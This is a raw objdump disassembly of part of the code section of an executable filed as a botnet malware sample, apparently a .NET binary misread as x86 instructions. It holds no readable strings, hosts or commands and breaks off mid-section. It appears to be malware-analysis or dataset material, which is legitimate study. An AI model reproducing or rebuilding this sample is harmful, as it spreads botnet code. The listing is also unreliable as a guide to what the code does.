
malware_samples/botnet/333722c8cd0d94c34ed5c6964a09a1f7229e4ad0e620afc566607fccd140f1e6.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 0b                	add    %cl,(%ebx)
  402002:	01 00                	add    %eax,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 e0 65 00    	add    %al,0x65e000
  402013:	00 ec                	add    %ch,%ah
  402015:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402055:	c2 18 00             	ret    $0x18
  402058:	48                   	dec    %eax
  402059:	33 c0                	xor    %eax,%eax
  40205b:	c3                   	ret
  40205c:	00 00                	add    %al,(%eax)
  40205e:	00 00                	add    %al,(%eax)
  402060:	b8 57 00 07 80       	mov    $0x80070057,%eax
  402065:	c3                   	ret
  402066:	00 00                	add    %al,(%eax)
  402068:	33 c0                	xor    %eax,%eax
  40206a:	c2 14 00             	ret    $0x14
  40206d:	00 00                	add    %al,(%eax)
  40206f:	00 2e                	add    %ch,(%esi)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1b 00                	sbb    (%eax),%eax
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 14                	jle    0x402097
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 15                	jle    0x4020a7
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 16                	jle    0x4020b7
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 17                	jle    0x4020c7
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 18                	jle    0x4020d7
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 19                	jle    0x4020e7
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 1a                	jle    0x4020f7
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1b                	jle    0x402107
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1c             	sbb    0x1c(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1d                	jle    0x40211f
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1e                	jle    0x40212f
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1e 00 00 04    	add    0x400001e(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	43                   	inc    %ebx
  402121:	00 00                	add    %al,(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	44                   	inc    %esp
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	fa                   	cli
  402136:	73 bd                	jae    0x4020f5
  402138:	00 00                	add    %al,(%eax)
  40213a:	06                   	push   %es
  40213b:	25 72 5f 14 00       	and    $0x145f72,%eax
  402140:	70 6f                	jo     0x4021b1
  402142:	a8 00                	test   $0x0,%al
  402144:	00 06                	add    %al,(%esi)
  402146:	28 68 00             	sub    %ch,0x0(%eax)
  402149:	00 0a                	add    %cl,(%edx)
  40214b:	72 27                	jb     0x402174
  40214d:	15 00 70 28 1d       	adc    $0x1d287000,%eax
  402152:	00 00                	add    %al,(%eax)
  402154:	0a 6f 1e             	or     0x1e(%edi),%ch
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 6f b5             	or     -0x4b(%edi),%ch
  40215c:	00 00                	add    %al,(%eax)
  40215e:	06                   	push   %es
  40215f:	6f                   	outsl  %ds:(%esi),(%dx)
  402160:	b2 00                	mov    $0x0,%dl
  402162:	00 06                	add    %al,(%esi)
  402164:	28 20                	sub    %ah,(%eax)
  402166:	00 00                	add    %al,(%eax)
  402168:	06                   	push   %es
  402169:	20 e8                	and    %ch,%al
  40216b:	03 00                	add    (%eax),%eax
  40216d:	00 28                	add    %ch,(%eax)
  40216f:	17                   	pop    %ss
  402170:	00 00                	add    %al,(%eax)
  402172:	0a 2a                	or     (%edx),%ch
  402174:	da 73 bd             	fidivl -0x43(%ebx)
  402177:	00 00                	add    %al,(%eax)
  402179:	06                   	push   %es
  40217a:	25 72 5f 14 00       	and    $0x145f72,%eax
  40217f:	70 6f                	jo     0x4021f0
  402181:	a8 00                	test   $0x0,%al
  402183:	00 06                	add    %al,(%esi)
  402185:	72 41                	jb     0x4021c8
  402187:	15 00 70 6f b5       	adc    $0xb56f7000,%eax
  40218c:	00 00                	add    %al,(%eax)
  40218e:	06                   	push   %es
  40218f:	25 72 41 15 00       	and    $0x154172,%eax
  402194:	70 6f                	jo     0x402205
  402196:	a8 00                	test   $0x0,%al
  402198:	00 06                	add    %al,(%esi)
  40219a:	02 6f b5             	add    -0x4b(%edi),%ch
  40219d:	00 00                	add    %al,(%eax)
  40219f:	06                   	push   %es
  4021a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a1:	b2 00                	mov    $0x0,%dl
  4021a3:	00 06                	add    %al,(%esi)
  4021a5:	28 20                	sub    %ah,(%eax)
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	06                   	push   %es
  4021aa:	2a 56 73             	sub    0x73(%esi),%dl
  4021ad:	1b 00                	sbb    (%eax),%eax
  4021af:	00 0a                	add    %cl,(%edx)
  4021b1:	80 1b 00             	sbbb   $0x0,(%ebx)
  4021b4:	00 04 73             	add    %al,(%ebx,%esi,2)
  4021b7:	69 00 00 0a 80 1f    	imul   $0x1f800a00,(%eax),%eax
  4021bd:	00 00                	add    %al,(%eax)
  4021bf:	04 2a                	add    $0x2a,%al
  4021c1:	1a 7e 22             	sbb    0x22(%esi),%bh
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	04 2a                	add    $0x2a,%al
  4021c8:	1e                   	push   %ds
  4021c9:	02 80 22 00 00 04    	add    0x4000022(%eax),%al
  4021cf:	2a 46 17             	sub    0x17(%esi),%al
  4021d2:	28 2b                	sub    %ch,(%ebx)
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	06                   	push   %es
  4021d7:	7e 21                	jle    0x4021fa
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	04 6f                	add    $0x6f,%al
  4021dd:	8d 00                	lea    (%eax),%eax
  4021df:	00 0a                	add    %cl,(%edx)
  4021e1:	2a 26                	sub    (%esi),%ah
  4021e3:	02 03                	add    (%ebx),%al
  4021e5:	19 6f 92             	sbb    %ebp,-0x6e(%edi)
  4021e8:	00 00                	add    %al,(%eax)
  4021ea:	0a 2a                	or     (%edx),%ch
  4021ec:	5e                   	pop    %esi
  4021ed:	17                   	pop    %ss
  4021ee:	16                   	push   %ss
  4021ef:	02 28                	add    (%eax),%ch
  4021f1:	34 00                	xor    $0x0,%al
  4021f3:	00 06                	add    %al,(%esi)
  4021f5:	25 16 28 36 00       	and    $0x362816,%eax
  4021fa:	00 06                	add    %al,(%esi)
  4021fc:	26 28 35 00 00 06 26 	sub    %dh,%es:0x26060000
  402203:	2a 5e 14             	sub    0x14(%esi),%bl
  402206:	fe 06                	incb   (%esi)
  402208:	2e 00 00             	add    %al,%cs:(%eax)
  40220b:	06                   	push   %es
  40220c:	73 8f                	jae    0x40219d
  40220e:	00 00                	add    %al,(%eax)
  402210:	0a 73 90             	or     -0x70(%ebx),%dh
  402213:	00 00                	add    %al,(%eax)
  402215:	0a 80 21 00 00 04    	or     0x4000021(%eax),%al
  40221b:	2a 6e 28             	sub    0x28(%esi),%ch
  40221e:	39 00                	cmp    %eax,(%eax)
  402220:	00 06                	add    %al,(%esi)
  402222:	3a 10                	cmp    (%eax),%dl
  402224:	00 00                	add    %al,(%eax)
  402226:	00 28                	add    %ch,(%eax)
  402228:	3a 00                	cmp    (%eax),%al
  40222a:	00 06                	add    %al,(%esi)
  40222c:	39 06                	cmp    %eax,(%esi)
  40222e:	00 00                	add    %al,(%eax)
  402230:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402233:	93                   	xchg   %eax,%ebx
  402234:	00 00                	add    %al,(%eax)
  402236:	0a 2a                	or     (%edx),%ch
  402238:	3e 28 3d 00 00 06 8e 	sub    %bh,%ds:0x8e060000
  40223f:	3a 02                	cmp    (%edx),%al
  402241:	00 00                	add    %al,(%eax)
  402243:	00 16                	add    %dl,(%esi)
  402245:	2a 17                	sub    (%edi),%dl
  402247:	2a 42 7e             	sub    0x7e(%edx),%al
  40224a:	2d 00 00 04 28       	sub    $0x28040000,%eax
  40224f:	3e 00 00             	add    %al,%ds:(%eax)
  402252:	06                   	push   %es
  402253:	6f                   	outsl  %ds:(%esi),(%dx)
  402254:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402259:	ba 72 2d 19 00       	mov    $0x192d72,%edx
  40225e:	70 73                	jo     0x4022d3
  402260:	b2 00                	mov    $0x0,%dl
  402262:	00 0a                	add    %cl,(%edx)
  402264:	80 2d 00 00 04 72 7b 	subb   $0x7b,0x72040000
  40226b:	19 00                	sbb    %eax,(%eax)
  40226d:	70 73                	jo     0x4022e2
  40226f:	b2 00                	mov    $0x0,%dl
  402271:	00 0a                	add    %cl,(%edx)
  402273:	80 2e 00             	subb   $0x0,(%esi)
  402276:	00 04 72             	add    %al,(%edx,%esi,2)
  402279:	c9                   	leave
  40227a:	19 00                	sbb    %eax,(%eax)
  40227c:	70 73                	jo     0x4022f1
  40227e:	b2 00                	mov    $0x0,%dl
  402280:	00 0a                	add    %cl,(%edx)
  402282:	80 2f 00             	subb   $0x0,(%edi)
  402285:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402288:	56                   	push   %esi
  402289:	28 cd                	sub    %cl,%ch
  40228b:	00 00                	add    %al,(%eax)
  40228d:	0a 73 ce             	or     -0x32(%ebx),%dh
  402290:	00 00                	add    %al,(%eax)
  402292:	0a 20                	or     (%eax),%ah
  402294:	20 02                	and    %al,(%edx)
  402296:	00 00                	add    %al,(%eax)
  402298:	6f                   	outsl  %ds:(%esi),(%dx)
  402299:	cf                   	iret
  40229a:	00 00                	add    %al,(%eax)
  40229c:	0a 2a                	or     (%edx),%ch
  40229e:	7a 02                	jp     0x4022a2
  4022a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a1:	d6                   	salc
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	0a 03                	or     (%ebx),%al
  4022a6:	3e 10 00             	adc    %al,%ds:(%eax)
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	02 02                	add    (%edx),%al
  4022ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ae:	d6                   	salc
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	0a 03                	or     (%ebx),%al
  4022b3:	59                   	pop    %ecx
  4022b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b5:	d7                   	xlat   %ds:(%ebx)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	0a 10                	or     (%eax),%dl
  4022ba:	00 02                	add    %al,(%edx)
  4022bc:	2a ba 02 28 53 00    	sub    0x532802(%edx),%bh
  4022c2:	00 06                	add    %al,(%esi)
  4022c4:	25 7e ad 00 00       	and    $0xad7e,%eax
  4022c9:	0a 28                	or     (%eax),%ch
  4022cb:	e3 00                	jecxz  0x4022cd
  4022cd:	00 0a                	add    %cl,(%edx)
  4022cf:	39 11                	cmp    %edx,(%ecx)
  4022d1:	00 00                	add    %al,(%eax)
  4022d3:	00 02                	add    %al,(%edx)
  4022d5:	72 85                	jb     0x40225c
  4022d7:	1c 00                	sbb    $0x0,%al
  4022d9:	70 28                	jo     0x402303
  4022db:	86 00                	xchg   %al,(%eax)
  4022dd:	00 0a                	add    %cl,(%edx)
  4022df:	73 e4                	jae    0x4022c5
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	0a 7a 03             	or     0x3(%edx),%bh
  4022e6:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  4022ea:	06                   	push   %es
  4022eb:	2a aa 02 03 28 52    	sub    0x52280302(%edx),%ch
  4022f1:	00 00                	add    %al,(%eax)
  4022f3:	06                   	push   %es
  4022f4:	25 7e ad 00 00       	and    $0xad7e,%eax
  4022f9:	0a 28                	or     (%eax),%ch
  4022fb:	e3 00                	jecxz  0x4022fd
  4022fd:	00 0a                	add    %cl,(%edx)
  4022ff:	39 0b                	cmp    %ecx,(%ebx)
  402301:	00 00                	add    %al,(%eax)
  402303:	00 72 33             	add    %dh,0x33(%edx)
  402306:	1d 00 70 73 f1       	sbb    $0xf1737000,%eax
  40230b:	00 00                	add    %al,(%eax)
  40230d:	0a 7a 04             	or     0x4(%edx),%bh
  402310:	05 28 56 00 00       	add    $0x5628,%eax
  402315:	06                   	push   %es
  402316:	2a 3e                	sub    (%esi),%bh
  402318:	02 03                	add    (%ebx),%al
  40231a:	28 f3                	sub    %dh,%bl
  40231c:	00 00                	add    %al,(%eax)
  40231e:	0a 04 50             	or     (%eax,%edx,2),%al
  402321:	6f                   	outsl  %ds:(%esi),(%dx)
  402322:	f4                   	hlt
  402323:	00 00                	add    %al,(%eax)
  402325:	0a 2a                	or     (%edx),%ch
  402327:	46                   	inc    %esi
  402328:	28 bd 00 00 0a 02    	sub    %bh,0x20a0000(%ebp)
  40232e:	28 1d 00 00 0a 6f    	sub    %bl,0x6f0a0000
  402334:	1e                   	push   %ds
  402335:	00 00                	add    %al,(%eax)
  402337:	0a 2a                	or     (%edx),%ch
  402339:	46                   	inc    %esi
  40233a:	02 72 89             	add    -0x77(%edx),%dh
  40233d:	1d 00 70 72 2d       	sbb    $0x2d727000,%eax
  402342:	1e                   	push   %ds
  402343:	00 70 28             	add    %dh,0x28(%eax)
  402346:	60                   	pusha
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a 62 02             	sub    0x2(%edx),%ah
  40234d:	7b 84                	jnp    0x4022d3
  40234f:	01 00                	add    %eax,(%eax)
  402351:	04 03                	add    $0x3,%al
  402353:	6f                   	outsl  %ds:(%esi),(%dx)
  402354:	6f                   	outsl  %ds:(%esi),(%dx)
  402355:	00 00                	add    %al,(%eax)
  402357:	0a 28                	or     (%eax),%ch
  402359:	8a 00                	mov    (%eax),%al
  40235b:	00 0a                	add    %cl,(%edx)
  40235d:	1b 6f ef             	sbb    -0x11(%edi),%ebp
  402360:	00 00                	add    %al,(%eax)
  402362:	0a 2a                	or     (%edx),%ch
  402364:	6e                   	outsb  %ds:(%esi),(%dx)
  402365:	7e 85                	jle    0x4022ec
  402367:	01 00                	add    %eax,(%eax)
  402369:	04 39                	add    $0x39,%al
  40236b:	10 00                	adc    %al,(%eax)
  40236d:	00 00                	add    %al,(%eax)
  40236f:	7e 85                	jle    0x4022f6
  402371:	01 00                	add    %eax,(%eax)
  402373:	04 6f                	add    $0x6f,%al
  402375:	00 01                	add    %al,(%ecx)
  402377:	00 0a                	add    %cl,(%edx)
  402379:	14 80                	adc    $0x80,%al
  40237b:	85 01                	test   %eax,(%ecx)
  40237d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402380:	56                   	push   %esi
  402381:	d0 1a                	rcrb   $1,(%edx)
  402383:	00 00                	add    %al,(%eax)
  402385:	02 28                	add    (%eax),%ch
  402387:	62 00                	bound  %eax,(%eax)
  402389:	00 0a                	add    %cl,(%edx)
  40238b:	28 91 00 00 0a 80    	sub    %dl,-0x7ff60000(%ecx)
  402391:	8a 01                	mov    (%ecx),%al
  402393:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402396:	7e 7e                	jle    0x402416
  402398:	0e                   	push   %cs
  402399:	00 00                	add    %al,(%eax)
  40239b:	04 28                	add    $0x28,%al
  40239d:	1a 00                	sbb    (%eax),%al
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	39 0f                	cmp    %ecx,(%edi)
  4023a3:	00 00                	add    %al,(%eax)
  4023a5:	00 28                	add    %ch,(%eax)
  4023a7:	49                   	dec    %ecx
  4023a8:	00 00                	add    %al,(%eax)
  4023aa:	06                   	push   %es
  4023ab:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4023b1:	70 00                	jo     0x4023b3
  4023b3:	00 06                	add    %al,(%esi)
  4023b5:	2a 56 72             	sub    0x72(%esi),%dl
  4023b8:	49                   	dec    %ecx
  4023b9:	1e                   	push   %ds
  4023ba:	00 70 7e             	add    %dh,0x7e(%eax)
  4023bd:	0f 00 00             	sldt   (%eax)
  4023c0:	04 28                	add    $0x28,%al
  4023c2:	86 00                	xchg   %al,(%eax)
  4023c4:	00 0a                	add    %cl,(%edx)
  4023c6:	80 8d 01 00 04 2a 5e 	orb    $0x5e,0x2a040001(%ebp)
  4023cd:	02 28                	add    (%eax),%ch
  4023cf:	1c 00                	sbb    $0x0,%al
  4023d1:	00 0a                	add    %cl,(%edx)
  4023d3:	03 6f 23             	add    0x23(%edi),%ebp
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	0a 28                	or     (%eax),%ch
  4023da:	78 00                	js     0x4023dc
  4023dc:	00 06                	add    %al,(%esi)
  4023de:	28 09                	sub    %cl,(%ecx)
  4023e0:	01 00                	add    %eax,(%eax)
  4023e2:	0a 2a                	or     (%edx),%ch
  4023e4:	5e                   	pop    %esi
  4023e5:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  4023e8:	00 0a                	add    %cl,(%edx)
  4023ea:	02 03                	add    (%ebx),%al
  4023ec:	28 1d 00 00 0a 28    	sub    %bl,0x280a0000
  4023f2:	7a 00                	jp     0x4023f4
  4023f4:	00 06                	add    %al,(%esi)
  4023f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f7:	1e                   	push   %ds
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	0a 2a                	or     (%edx),%ch
  4023fc:	56                   	push   %esi
  4023fd:	28 bd 00 00 0a 72    	sub    %bh,0x720a0000(%ebp)
  402403:	29 1f                	sub    %ebx,(%edi)
  402405:	00 70 6f             	add    %dh,0x6f(%eax)
  402408:	23 00                	and    (%eax),%eax
  40240a:	00 0a                	add    %cl,(%edx)
  40240c:	80 94 01 00 04 2a 32 	adcb   $0x7e,0x322a0400(%ecx,%eax,1)
  402413:	7e 
  402414:	99                   	cltd
  402415:	01 00                	add    %eax,(%eax)
  402417:	04 02                	add    $0x2,%al
  402419:	6f                   	outsl  %ds:(%esi),(%dx)
  40241a:	23 00                	and    (%eax),%eax
  40241c:	00 0a                	add    %cl,(%edx)
  40241e:	2a 32                	sub    (%edx),%dh
  402420:	7e 99                	jle    0x4023bb
  402422:	01 00                	add    %eax,(%eax)
  402424:	04 02                	add    $0x2,%al
  402426:	6f                   	outsl  %ds:(%esi),(%dx)
  402427:	1e                   	push   %ds
  402428:	00 00                	add    %al,(%eax)
  40242a:	0a 2a                	or     (%edx),%ch
  40242c:	32 02                	xor    (%edx),%al
  40242e:	28 1f                	sub    %bl,(%edi)
  402430:	01 00                	add    %eax,(%eax)
  402432:	0a 28                	or     (%eax),%ch
  402434:	81 00 00 06 2a 8e    	addl   $0x8e2a0600,(%eax)
  40243a:	1a 8d 53 00 00 01    	sbb    0x1000053(%ebp),%cl
  402440:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402445:	25 18 02 1e 63       	and    $0x631e0218,%eax
  40244a:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  402451:	63 d2                	arpl   %edx,%edx
  402453:	9c                   	pushf
  402454:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402459:	63 d2                	arpl   %edx,%edx
  40245b:	9c                   	pushf
  40245c:	2a 4e 18             	sub    0x18(%esi),%cl
  40245f:	8d 53 00             	lea    0x0(%ebx),%edx
  402462:	00 01                	add    %al,(%ecx)
  402464:	25 17 02 d2 9c       	and    $0x9cd20217,%eax
  402469:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40246e:	d2 9c 2a 32 02 28 20 	rcrb   %cl,0x20280232(%edx,%ebp,1)
  402475:	01 00                	add    %eax,(%eax)
  402477:	0a 28                	or     (%eax),%ch
  402479:	81 00 00 06 2a 2e    	addl   $0x2e2a0600,(%eax)
  40247f:	73 21                	jae    0x4024a2
  402481:	01 00                	add    %eax,(%eax)
  402483:	0a 80 99 01 00 04    	or     0x4000199(%eax),%al
  402489:	2a 56 02             	sub    0x2(%esi),%dl
  40248c:	15 7d 9b 01 00       	adc    $0x19b7d,%eax
  402491:	04 02                	add    $0x2,%al
  402493:	28 1b                	sub    %bl,(%ebx)
  402495:	00 00                	add    %al,(%eax)
  402497:	0a 02                	or     (%edx),%al
  402499:	03 7d 9a             	add    -0x66(%ebp),%edi
  40249c:	01 00                	add    %eax,(%eax)
  40249e:	04 2a                	add    $0x2a,%al
  4024a0:	4a                   	dec    %edx
  4024a1:	02 7b 9a             	add    -0x66(%ebx),%bh
  4024a4:	01 00                	add    %eax,(%eax)
  4024a6:	04 02                	add    $0x2,%al
  4024a8:	7b 9b                	jnp    0x402445
  4024aa:	01 00                	add    %eax,(%eax)
  4024ac:	04 6f                	add    $0x6f,%al
  4024ae:	22 01                	and    (%ecx),%al
  4024b0:	00 0a                	add    %cl,(%edx)
  4024b2:	2a 8a 02 02 7b 9b    	sub    -0x6484fdfe(%edx),%cl
  4024b8:	01 00                	add    %eax,(%eax)
  4024ba:	04 17                	add    $0x17,%al
  4024bc:	58                   	pop    %eax
  4024bd:	7d 9b                	jge    0x40245a
  4024bf:	01 00                	add    %eax,(%eax)
  4024c1:	04 02                	add    $0x2,%al
  4024c3:	7b 9b                	jnp    0x402460
  4024c5:	01 00                	add    %eax,(%eax)
  4024c7:	04 02                	add    $0x2,%al
  4024c9:	7b 9a                	jnp    0x402465
  4024cb:	01 00                	add    %eax,(%eax)
  4024cd:	04 6f                	add    $0x6f,%al
  4024cf:	23 01                	and    (%ecx),%eax
  4024d1:	00 0a                	add    %cl,(%edx)
  4024d3:	fe 04 2a             	incb   (%edx,%ebp,1)
  4024d6:	22 02                	and    (%edx),%al
  4024d8:	15 7d 9b 01 00       	adc    $0x19b7d,%eax
  4024dd:	04 2a                	add    $0x2a,%al
  4024df:	56                   	push   %esi
  4024e0:	02 28                	add    (%eax),%ch
  4024e2:	1b 00                	sbb    (%eax),%eax
  4024e4:	00 0a                	add    %cl,(%edx)
  4024e6:	02 03                	add    (%ebx),%al
  4024e8:	7d 9d                	jge    0x402487
  4024ea:	01 00                	add    %eax,(%eax)
  4024ec:	04 02                	add    $0x2,%al
  4024ee:	04 7d                	add    $0x7d,%al
  4024f0:	9c                   	pushf
  4024f1:	01 00                	add    %eax,(%eax)
  4024f3:	04 2a                	add    $0x2a,%al
  4024f5:	32 02                	xor    (%edx),%al
  4024f7:	7b 9d                	jnp    0x402496
  4024f9:	01 00                	add    %eax,(%eax)
  4024fb:	04 6f                	add    $0x6f,%al
  4024fd:	9a 00 00 06 2a 4e 02 	lcall  $0x24e,$0x2a060000
  402504:	7b 9d                	jnp    0x4024a3
  402506:	01 00                	add    %eax,(%eax)
  402508:	04 6f                	add    $0x6f,%al
  40250a:	9a 00 00 06 25 03 6f 	lcall  $0x6f03,$0x25060000
  402511:	b5 00                	mov    $0x0,%ch
  402513:	00 06                	add    %al,(%esi)
  402515:	2a 4e 02             	sub    0x2(%esi),%cl
  402518:	7b 9d                	jnp    0x4024b7
  40251a:	01 00                	add    %eax,(%eax)
  40251c:	04 6f                	add    $0x6f,%al
  40251e:	9a 00 00 06 25 03 6f 	lcall  $0x6f03,$0x25060000
  402525:	9d                   	popf
  402526:	00 00                	add    %al,(%eax)
  402528:	06                   	push   %es
  402529:	2a 4e 02             	sub    0x2(%esi),%cl
  40252c:	7b 9d                	jnp    0x4024cb
  40252e:	01 00                	add    %eax,(%eax)
  402530:	04 6f                	add    $0x6f,%al
  402532:	9a 00 00 06 25 03 6f 	lcall  $0x6f03,$0x25060000
  402539:	ae                   	scas   %es:(%edi),%al
  40253a:	00 00                	add    %al,(%eax)
  40253c:	06                   	push   %es
  40253d:	2a 36                	sub    (%esi),%dh
  40253f:	02 7b 9c             	add    -0x64(%ebx),%bh
  402542:	01 00                	add    %eax,(%eax)
  402544:	04 03                	add    $0x3,%al
  402546:	6f                   	outsl  %ds:(%esi),(%dx)
  402547:	22 01                	and    (%ecx),%al
  402549:	00 0a                	add    %cl,(%edx)
  40254b:	2a 32                	sub    (%edx),%dh
  40254d:	02 7b 9c             	add    -0x64(%ebx),%bh
  402550:	01 00                	add    %eax,(%eax)
  402552:	04 6f                	add    $0x6f,%al
  402554:	23 01                	and    (%ecx),%eax
  402556:	00 0a                	add    %cl,(%edx)
  402558:	2a 66 02             	sub    0x2(%esi),%ah
  40255b:	03 7d 9e             	add    -0x62(%ebp),%edi
  40255e:	01 00                	add    %eax,(%eax)
  402560:	04 02                	add    $0x2,%al
  402562:	02 7b 9e             	add    -0x62(%ebx),%bh
  402565:	01 00                	add    %eax,(%eax)
  402567:	04 6f                	add    $0x6f,%al
  402569:	c8 00 00 0a          	enter  $0x0,$0xa
  40256d:	7d 9f                	jge    0x40250e
  40256f:	01 00                	add    %eax,(%eax)
  402571:	04 2a                	add    $0x2a,%al
  402573:	82 02 7b             	addb   $0x7b,(%edx)
  402576:	a1 01 00 04 18       	mov    0x18040001,%eax
  40257b:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  402581:	28 94 00 00 06 02 18 	sub    %dl,0x18020600(%eax,%eax,1)
  402588:	7d a1                	jge    0x40252b
  40258a:	01 00                	add    %eax,(%eax)
  40258c:	04 02                	add    $0x2,%al
  40258e:	28 95 00 00 06 2a    	sub    %dl,0x2a060000(%ebp)
  402594:	82 02 7b             	addb   $0x7b,(%edx)
  402597:	a1 01 00 04 19       	mov    0x19040001,%eax
  40259c:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  4025a2:	28 94 00 00 06 02 19 	sub    %dl,0x19020600(%eax,%eax,1)
  4025a9:	7d a1                	jge    0x40254c
  4025ab:	01 00                	add    %eax,(%eax)
  4025ad:	04 02                	add    $0x2,%al
  4025af:	28 95 00 00 06 2a    	sub    %dl,0x2a060000(%ebp)
  4025b5:	1e                   	push   %ds
  4025b6:	02 28                	add    (%eax),%ch
  4025b8:	99                   	cltd
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	06                   	push   %es
  4025bc:	2a 52 02             	sub    0x2(%edx),%dl
  4025bf:	03 8c 8d 00 00 01 7d 	add    0x7d010000(%ebp,%ecx,4),%ecx
  4025c6:	a0 01 00 04 02       	mov    0x2040001,%al
  4025cb:	1b 7d a1             	sbb    -0x5f(%ebp),%edi
  4025ce:	01 00                	add    %eax,(%eax)
  4025d0:	04 2a                	add    $0x2a,%al
  4025d2:	52                   	push   %edx
  4025d3:	02 03                	add    (%ebx),%al
  4025d5:	8c b3 00 00 01 7d    	mov    %?,0x7d010000(%ebx)
  4025db:	a0 01 00 04 02       	mov    0x2040001,%al
  4025e0:	1c 7d                	sbb    $0x7d,%al
  4025e2:	a1 01 00 04 2a       	mov    0x2a040001,%eax
  4025e7:	42                   	inc    %edx
  4025e8:	02 03                	add    (%ebx),%al
  4025ea:	7d a0                	jge    0x40258c
